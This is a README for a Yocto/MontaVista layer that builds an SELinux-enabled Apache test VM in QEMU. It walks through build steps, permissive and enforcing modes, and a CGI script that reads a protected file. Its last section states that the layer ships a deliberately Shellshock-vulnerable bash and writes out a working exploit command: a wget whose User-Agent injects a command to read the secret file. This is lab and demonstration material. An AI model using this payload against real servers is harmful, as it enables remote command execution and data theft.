Checkout CGX4.0 BSP per procecures

In the layers directory, checkout:
  https://github.com/MontaVista-OpenSourceTechnology/meta-apacheconf.git

In project/conf/bblayers, add:
  ${TOPDIR}/../layers/meta-apacheconf \
to the BBLAYERS variable.

Add the following to project/conf/local.conf:
  DISTRO_FEATURES:append = " acl xattr pam selinux"
  PREFERRED_PROVIDER_virtual/refpolicy ?= "refpolicy-apacheconf"
  DEFAULT_ENFORCING="permissive"

In the project directory, run:
  bitbake core-image-selinux-apacheconf

To run the VM, do:

  qemu-system-x86_64 --machine q35 -m 1G -enable-kvm -drive file=tmp/deploy/images/x86-generic-64/core-image-selinux-apacheconf-x86-generic-64.ext4,format=raw -nographic -net nic,model=e1000,macaddr=52:54:00:12:34:61 -net user,hostfwd=tcp::5556-10.0.2.15:22,hostfwd=tcp::8080-10.0.2.15:80 -kernel tmp/deploy/images/x86-generic-64/bzImage-x86-generic-64.bin -append "root=/dev/sda console=ttyS0,115200 selinux=1 enforcing=0"

/etc/network/interfaces should have:

  auto eth0
  iface eth0 inet dhcp

in it, per the recipe, but you should make sure.  It may need to be
adjusted if your network device isn't eth0, or that can be fixed in
the apacheconf layer.

/etc/syslog-ng/syslog-ng.conf is fixed in this layer to comment out
the lines that have d_xconsole in them.  This will eliminate some
denials; syslog-ng will try to log to the X server but the X server is
not configured in the policy.

/etc/apache2/httpd.conf will have cgid_module uncommented by the webif
package.

By default /etc/selinux/config should have:

  SELINUX=permissive

Scripts are in /usr/libexec/apache2/modules/cgi-bin.  In that
directory, the script webif is what we will be using.  The
recipes-apps/webif recipe will build this, you can modify that to do
different things if you like.

You will be running with selinux enabled but in permissive mode, so if
an invalid access happens it will be allowed but an audit log will
print.  You should be able to connect your browser to localhost:8080
to talk to apache in qemu, and you can do: ssh -p 5556 root@localhost
to log in to the VM.

You can pass parameters to the test-cgi script by doing something like:
  http://localhost:8080/cgi-bin/webif?parm1=a&parm2=b

Those parms will show up in the QUERY_STRING environment variable.  In
the future, you could use those to pass things in to do differnt
things.

Unfortunately, the standard apache policy give wide-ranging access to
thing in /etc and other places.  I found that /var/run/sshd.pid is not
allowed, though.  I have added a program /usr/bin/supsec that accessed
the file /usr/share/super-secret/data that is not allowed.

By default webif will try to run /usr/bin/supsec and access
/usr/share/super-secret-data.  You will see "Super Secret Data" in the
output of the web page if enforcement is off, and errors if
enforcement is on.

If you run:
  setenforce 1

it will enable full enforcement and you will get audit logs and
invalid accesses will be denied.

This repository also contains an shellshock vulnerable version of
bash.  To exploit it, on the host run:
  wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /usr/share/super-secret/data" http://localhost:8080/cgi-bin/webif

This is from https://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited
